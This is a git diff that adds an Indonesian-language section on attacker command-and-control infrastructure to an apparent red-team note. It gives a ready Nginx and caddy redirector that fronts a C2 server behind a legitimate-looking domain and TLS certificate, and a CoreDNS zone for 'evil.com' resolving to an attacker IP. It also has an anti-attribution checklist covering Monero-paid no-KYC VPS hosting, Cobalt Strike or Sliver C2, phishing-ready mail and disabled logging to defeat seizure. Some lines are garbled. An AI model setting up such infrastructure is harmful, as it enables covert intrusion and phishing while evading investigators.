@@ -110,3 +110,73 @@ Detection:
 - Fast-flux — https://en.wikipedia.org/wiki/Fast_flux
 - Passive DNS — https://securitytrails.com/
 - Domain fronting — https://www.bamsoftware.com/papers/fronting/
+
+## Konkret — Infrastructure Payload (Testable)
+
+### Redirector (Nginx reverse proxy)
+
+```nginx
+# /etc/nginx/sites-enabled/redirector.conf
+server {
+    listen 443 ssl;
+    server_name cdn-legit.com;
+    ssl_certificate /etc/letsencrypt/live/cdn-legit.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/cdn-legit.com/privkey.pem;
+
+    location / {
+        proxy_pass https://C2_SERVER:8443/;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
+
+# Hasil: traffic target → cdn-legit.com (redirector) → C2 server real
+# Target lihat TLS cert legit → tidak curiga
+```
+
+### Domain Legit (TVFive-Layer)
+
+```bash
+# 1. Beli domain aged (>= 1 tahun registered, history clean)
+# 2. Kategori: tech, CDN, software company
+# 3. TLS cert free (Let's Encrypt / caddy)
+caddy reverse-proxy --from cdn-legit.com --to C2_IP:8443
+# 4. Email server (SPF/DKIM/DMARC pass) → phishing credible
+# 5. Jitter traffic: simulate normal user behavior (Chrome UA, browser finger L/R)
+```
+
+### DNS sinkhole redirect (self-hosted DNS server)
+
+```bash
+# CoreDNS config (custom zone + attacker domain)
+# zone evil.com → A record ke attacker IP
+# any query *.evil.com → 1 record [attack IP]
+cat > Corefile <<EOF
+evil.com:53 {
+    file /etc/coredns/zones/evil.com.zone
+}
+EOF
+
+# nslookup verify
+nslookup test.evil.com localhost
+# attacker IP siap menerima C2 traffic
+```
+
+### VPS Setup (Anti-Attribution)
+
+```bash
+# Prolexic attack: go Infra on Crypto VPS provider (pay via Monero)
+# Jurisdiction: pilih yang tidak MLA dengan target country
+# No KYC: offshore / VPN provider via Monero
+# Ket :
+
+# 1. Rent VPS X (Monero)
+# 2. Setup redirector (CF / openresty) → dom senjata
+# 3. C2 server (Cobalt Strike / Sliver) di VPS Y
+# 4. DNS at auth NS provider (freeDNS removed / bareDNS )
+# 5. Logging OFF di semua server (no trace jika seized)
+```
+---
+
+audited
+---
